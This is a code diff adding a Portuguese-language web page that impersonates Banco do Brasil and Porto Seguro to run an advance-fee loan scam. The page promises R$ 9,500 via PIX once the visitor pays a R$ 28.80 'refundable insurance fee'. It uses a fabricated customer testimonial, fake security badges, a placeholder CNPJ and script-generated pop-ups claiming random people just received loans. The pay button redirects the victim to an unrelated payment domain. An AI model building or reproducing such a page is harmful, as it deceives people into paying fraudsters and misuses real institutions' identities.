@@ -1,0 +1,785 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco do Brasil - Liberação Imediata do Seu Empréstimo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #003875;
+      --primary-dark: #0056b3;
+      --secondary: #003875;
+      --dark: #111827;
+      --light: #f3f4f6;
+      --white: #ffffff;
+      --success: #e8f2ff;
+      --success-text: #003875;
+      --warning-bg: #fef3c7;
+      --warning-text: #92400e;
+      --danger: #dc2626;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--light);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #374151;
+      line-height: 1.5;
+    }
+    
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background-color: var(--white);
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      margin: 20px 0;
+    }
+    
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+      font-weight: 600;
+      font-size: 18px;
+      background: linear-gradient(135deg, #003875 0%, #0056b3 100%);
+      padding: 15px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 56, 117, 0.15);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .logo::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+      animation: shine 3s infinite;
+    }
+    
+    .logo img {
+      max-width: 70px !important;
+      height: auto;
+      filter: brightness(1.1) contrast(1.05);
+      transition: transform 0.3s ease;
+    }
+    
+    .logo:hover img {
+      transform: scale(1.05);
+    }
+    
+    @keyframes shine {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+    
+    h1 {
+      font-size: 20px;
+      margin-bottom: 8px;
+      font-weight: 700;
+      color: var(--dark);
+    }
+    
+    .subtitle {
+      color: #4b5563;
+      font-size: 15px;
+    }
+    
+    /* Card de Seguro */
+    .card {
+      background-color: var(--secondary);
+      color: var(--white);
+      padding: 20px;
+      border-radius: 10px;
+      margin: 24px 0;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .card::after {
+      content: "";
+      position: absolute;
+      top: -50px;
+      right: -50px;
+      width: 120px;
+      height: 120px;
+      background-color: rgba(255,255,255,0.1);
+      border-radius: 50%;
+    }
+    
+    .card-title {
+      font-weight: 700;
+      font-size: 18px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .card-title svg {
+      width: 20px;
+      height: 20px;
+    }
+    
+    .card-text {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    
+    /* Seção de Urgência */
+    .urgency-banner {
+      background-color: var(--warning-bg);
+      padding: 16px;
+      border-radius: 8px;
+      margin: 24px 0;
+      text-align: center;
+      border: 1px solid rgba(146, 64, 14, 0.2);
+    }
+    
+    .urgency-title {
+      color: var(--warning-text);
+      font-weight: 700;
+      font-size: 15px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    
+    .viewers-count {
+      font-size: 13px;
+      color: var(--warning-text);
+      font-weight: 500;
+    }
+    
+    /* Tabela de Tarifas */
+    .section-title {
+      font-weight: 600;
+      margin-bottom: 12px;
+      font-size: 15px;
+      color: var(--dark);
+    }
+    
+    .tarifa-table {
+      width: 100%;
+      font-size: 18px;
+      margin-bottom: 24px;
+      border-collapse: collapse;
+    }
+    
+    .tarifa-table tr:not(:last-child) td {
+      padding-bottom: 10px;
+    }
+    
+    .tarifa-table td {
+      padding: 6px 0;
+      border-bottom: 1px solid #e5e7eb;
+      vertical-align: top;
+    }
+    
+    .tarifa-table .total {
+      font-weight: 700;
+      color: var(--primary);
+    }
+    
+    .tarifa-table td:last-child {
+      text-align: right;
+      font-weight: 500;
+    }
+    
+    /* Valor do Empréstimo */
+    .loan-box {
+      background-color: var(--success);
+      padding: 20px;
+      border-radius: 10px;
+      margin: 28px 0;
+      text-align: center;
+      border: 1px solid rgba(6, 95, 70, 0.2);
+    }
+    
+    .loan-amount {
+      font-size: 32px;
+      font-weight: 800;
+      color: var(--success-text);
+      margin: 8px 0;
+    }
+    
+    .loan-details {
+      font-size: 14px;
+      color: var(--success-text);
+      font-weight: 500;
+    }
+    
+    /* Benefícios */
+    .benefits {
+      list-style: none;
+      padding: 0;
+      margin: 24px 0;
+    }
+    
+    .benefits li {
+      padding: 8px 0;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+    }
+    
+    .benefits li::before {
+      content: '✓';
+      color: var(--primary);
+      font-weight: bold;
+      flex-shrink: 0;
+    }
+    
+    /* Botão Principal */
+    .cta-button {
+      display: block;
+      width: 100%;
+      background-color: var(--primary);
+      color: white;
+      text-align: center;
+      padding: 16px;
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 17px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      margin: 24px 0;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 16px rgba(0, 56, 117, 0.4);
+    }
+    
+    .cta-button:hover {
+      background-color: #0056b3;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 56, 117, 0.5);
+    }
+    
+    .cta-button:active {
+      transform: translateY(0);
+    }
+    
+    .button-icon {
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 50px;
+      background-color: rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+    }
+    
+    .button-text {
+      padding-left: 10px;
+    }
+    
+    .button-subtext {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      opacity: 0.9;
+      margin-top: 4px;
+    }
+    
+    /* Selos de Segurança */
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin: 20px 0;
+      flex-wrap: wrap;
+    }
+    
+    .badge {
+      height: 30px;
+      filter: grayscale(100%) contrast(60%);
+      transition: all 0.3s ease;
+      object-fit: contain;
+    }
+    
+    .badge:hover {
+      filter: none;
+      transform: scale(1.05);
+    }
+    
+    /* Depoimento */
+    .testimonial {
+      background: #f8fafc;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 24px 0;
+      border: 1px solid #e2e8f0;
+    }
+    
+    .testimonial-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+    
+    .testimonial-avatar {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    
+    .testimonial-name {
+      font-weight: 600;
+      font-size: 14px;
+    }
+    
+    .testimonial-meta {
+      font-size: 12px;
+      color: #64748b;
+    }
+    
+    .testimonial-text {
+      font-size: 14px;
+      color: #334155;
+      font-style: italic;
+      padding-left: 8px;
+      border-left: 2px solid #e2e8f0;
+    }
+    
+    /* FAQ */
+    .faq {
+      margin: 24px 0;
+    }
+    
+    .faq-title {
+      font-weight: 600;
+      color: #1e293b;
+      margin-bottom: 16px;
+      font-size: 15px;
+    }
+    
+    .faq-item {
+      margin-bottom: 12px;
+      border-bottom: 1px solid #e2e8f0;
+      padding-bottom: 12px;
+    }
+    
+    .faq-question {
+      font-size: 14px;
+      color: #475569;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-weight: 500;
+    }
+    
+    .faq-question::after {
+      content: "+";
+      font-size: 18px;
+    }
+    
+    .faq-answer {
+      font-size: 13px;
+      color: #475569;
+      margin-top: 8px;
+      padding-left: 8px;
+      display: none;
+    }
+    
+    /* Footer */
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #9ca3af;
+      margin-top: 32px;
+      line-height: 1.6;
+    }
+    
+    .footer a {
+      color: #6b7280;
+      text-decoration: none;
+    }
+    
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(4px);
+    }
+    
+    .modal-content {
+      background-color: #fff;
+      padding: 24px;
+      border-radius: 12px;
+      max-width: 400px;
+      margin: 15% auto;
+      text-align: center;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      position: relative;
+      animation: modalFadeIn 0.3s ease;
+    }
+    
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .modal-close {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      color: #6b7280;
+    }
+    
+    /* Notificações */
+    .notification-container {
+      position: fixed;
+      bottom: 50px;
+      left: 20px;
+      z-index: 1000;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    
+    .notification {
+      background-color: var(--white);
+      padding: 12px 16px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      animation: slideIn 0.3s ease;
+      max-width: 250px;
+      font-size: 14px;
+      border-left: 4px solid var(--primary);
+    }
+    
+    .notification strong {
+      color: var(--primary);
+    }
+    
+    @keyframes slideIn {
+      from { transform: translateX(-100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    
+    /* Responsividade */
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+        border-radius: 0;
+        margin: 0;
+        min-height: 100vh;
+      }
+      
+      .loan-amount {
+        font-size: 28px;
+      }
+      
+      .notification-container {
+        left: 10px;
+        right: 10px;
+        bottom: 10px;
+      }
+      
+      .notification {
+        max-width: 100%;
+      }
+      
+      body {
+        display: block;
+        background-color: var(--white);
+      }
+    }
+  </style>
+  
+  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <link rel="stylesheet" href="css/style.css">
+<script>
+  window.pixelId = "680b957c35700b15a4c281f6";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "r4p194wmkl");
+</script>
+</head>
+<body>
+  <!-- Modal -->
+  <div class="modal" id="popup">
+    <div class="modal-content">
+      <button class="modal-close" onclick="fecharPopup()">×</button>
+      <h3 style="margin-bottom: 16px; color: var(--dark);">Atenção!</h3>
+      <p style="margin-bottom: 20px; font-size: 15px;">
+        Após o pagamento da taxa de seguro, permaneça nesta página para concluir a abertura da sua conta e garantir o recebimento imediato do valor aprovado.
+      </p>
+      <button class="cta-button" onclick="fecharPopup()" style="margin: 0 auto 8px; max-width: 200px;">
+        <div class="button-icon">✓</div>
+        <div class="button-text">Entendi</div>
+      </button>
+    </div>
+  </div>
+
+  <!-- Container de Notificações -->
+  <div class="notification-container" id="notificationContainer"></div>
+
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <img src="images/logo.png" alt="Banco do Brasil">
+      </div>
+      <h1>Garanta seu empréstimo agora!</h1>
+      <p class="subtitle">Confirme os detalhes abaixo para liberação imediata via PIX</p>
+    </div>
+
+    <!-- Card de Seguro -->
+    <div class="card">
+      <div class="card-title">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+        </svg>
+        Porto Seguro
+      </div>
+      <p class="card-text">
+        A BANCO DO BRASIL trabalha com a parceria da Porto Seguro para oferecer proteção total ao seu empréstimo. Em caso de imprevistos, a seguradora cobre integralmente o saldo pendente.
+        <br><br>
+        O valor do seguro é uma taxa única, contratada no início do processo e 100% reembolsável ao final do contrato.
+      </p>
+    </div>
+
+    <!-- Tabela de Tarifas -->
+    <div class="section-title">Detalhamento da Tarifa do Seguro</div>
+    <table class="tarifa-table">
+      <tbody><tr><td>Declaração do seguro</td><td>R$ 12,64</td></tr>
+      <tr><td>Proteção da seguradora</td><td>R$ 11,90</td></tr>
+      <tr><td>Apólice digital</td><td>R$ 04,26</td></tr>
+      <tr class="total"><td>Total do seguro</td><td>R$ 28,80</td></tr>
+    </tbody></table>
+
+    <!-- Valor do Empréstimo -->
+    <div class="loan-box">
+      <div class="section-title">Valor do empréstimo</div>
+      <div class="loan-amount">R$ 9.500,00</div>
+      <p class="loan-details">Após o pagamento da taxa de seguro, o valor será liberado para sua chave PIX em até 10 minutos.</p>
+    </div>
+
+    <!-- Benefícios -->
+    <ul class="benefits">
+      <li>Liberação rápida via PIX em até 5 minutos</li>
+      <li>Proteção 100% garantida pela Porto Seguro</li>
+      <li>Taxa única com reembolso integral</li>
+    </ul>
+
+    <!-- Depoimento -->
+    <div class="testimonial">
+      <div class="testimonial-header">
+        <img src="images/43.jpg" alt="Cliente Satisfeita" class="testimonial-avatar" loading="lazy">
+        <div>
+          <div class="testimonial-name">Marta Fernandes</div>
+          <div class="testimonial-meta">Liberado em 4 minutos</div>
+        </div>
+      </div>
+      <p class="testimonial-text">
+        "Paguei o seguro e antes mesmo de sair da página o dinheiro já estava na minha conta. Processo super rápido e seguro, recomendo!"
+      </p>
+    </div>
+
+    <!-- Botão Principal -->
+    <button class="cta-button" onclick="mostrarPopup()">
+      <div class="button-icon">💳</div>
+      <div class="button-text">
+        PAGAR AGORA E RECEBER
+        <span class="button-subtext">Liberação imediata via PIX</span>
+      </div>
+    </button>
+
+    <!-- Selos de Segurança -->
+    <div class="trust-badges">
+      <img src="images/site-blindado-logo.png" class="badge" alt="Site Blindado" loading="lazy">
+      <img src="images/reclame-aqui-logo.png" class="badge" alt="Reclame Aqui" loading="lazy">
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      © 2025 Banco do Brasil - SA - Todos os direitos reservados.<br>
+      CNPJ: 00.000.000/0001-91<br>
+      <a href="#">Política de Privacidade</a> | <a href="#">Termos de Uso</a>
+    </div>
+  </div>
+
+  <script>
+    // Modal
+    function mostrarPopup() {
+      document.getElementById('popup').style.display = 'block';
+      document.body.style.overflow = 'hidden';
+    }
+    
+    function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search.substring(1);
+            const pairs = queryString.split('&');
+        
+            pairs.forEach(pair => {
+                const [key, value] = pair.split('=');
+                if (key) {
+                    params[decodeURIComponent(key)] = decodeURIComponent(value || '');
+                }
+            });
+        
+            return params;
+        }
+        
+        // Função para construir a nova URL com os parâmetros
+        function buildUrlWithParams(baseUrl, params) {
+            const queryString = Object.keys(params)
+                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+                .join('&');
+        
+            return `${baseUrl}?${queryString}`;
+        }
+        
+        
+    function fecharPopup() {
+      document.getElementById('popup').style.display = 'none';
+      document.body.style.overflow = 'auto';
+      // Redirecionamento para o Google
+      setTimeout(function() {
+          
+        const params = getUrlParams();
+        
+        // Constrói a nova URL com os parâmetros
+        const newUrl = buildUrlWithParams('https://pay.pagamentosfacilitadosoficial.shop/5pjw3RnKmrr32lQ', params);
+
+        // Redireciona para a nova URL
+        window.location.href = newUrl;
+        
+      }, 100);
+    }
+    
+    // Fechar modal ao clicar fora
+    window.onclick = function(event) {
+      if (event.target == document.getElementById('popup')) {
+        fecharPopup();
+      }
+    }
+    
+    // Lista de nomes e valores para as notificações
+    const nomes = ['Luiza', 'Pietro', 'Ana', 'Pedro', 'Mariana', 'Guilherme', 'Fernanda', 'Ricardo', 'Patrícia', 'Marcos','Mirela','Gustavo','Vitor','Hernandes', 'Murilo', 'Mariana'];
+    const valores = [4300, 5200, 9200, 7700, 3800, 6100, 2900, 4700, 5500, 3200, 4900, 4100, 8200, 3400, 5900, 6300];
+    
+    // Função para criar notificação
+    function criarNotificacao() {
+      const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
+      const valorAleatorio = valores[Math.floor(Math.random() * valores.length)];
+      
+      const notification = document.createElement('div');
+      notification.className = 'notification';
+      notification.innerHTML = `<strong>${nomeAleatorio}</strong> conseguiu um empréstimo no valor de: <strong>R$${valorAleatorio.toLocaleString('pt-BR')}</strong>`;
+      
+      const container = document.getElementById('notificationContainer');
+      container.appendChild(notification);
+      
+      // Remove a notificação após 5 segundos
+      setTimeout(() => {
+        notification.style.animation = 'slideIn 0.3s ease reverse';
+        setTimeout(() => {
+          container.removeChild(notification);
+        }, 300);
+      }, 5000);
+    }
+    
+    // Mostrar primeira notificação após 3 segundos
+    setTimeout(criarNotificacao, 3000);
+    
+    // Mostrar notificações aleatórias a cada 8-15 segundos
+    setInterval(() => {
+      criarNotificacao();
+    }, Math.random() * 7000 + 8000);
+    
+    // FAQ Accordion
+    const faqQuestions = document.querySelectorAll('.faq-question');
+    faqQuestions.forEach(question => {
+      question.addEventListener('click', () => {
+        const answer = question.nextElementSibling;
+        const isOpen = answer.style.display === 'block';
+        
+        // Fecha todas as respostas
+        document.querySelectorAll('.faq-answer').forEach(ans => {
+          ans.style.display = 'none';
+          ans.previousElementSibling.innerHTML = ans.previousElementSibling.textContent + ' +';
+        });
+        
+        // Abre a resposta clicada se não estava aberta
+        if (!isOpen) {
+          answer.style.display = 'block';
+          question.innerHTML = question.textContent + ' -';
+        }
+      });
+    });
+    
+    // Efeito de digitação no título
+    const title = document.querySelector('h1');
+    const originalText = title.textContent;
+    title.textContent = '';
+    
+    let i = 0;
+    const typingEffect = setInterval(() => {
+      if (i < originalText.length) {
+        title.textContent += originalText.charAt(i);
+        i++;
+      } else {
+        clearInterval(typingEffect);
+      }
+    }, 50);
+  </script>
+
+
+</body></html>
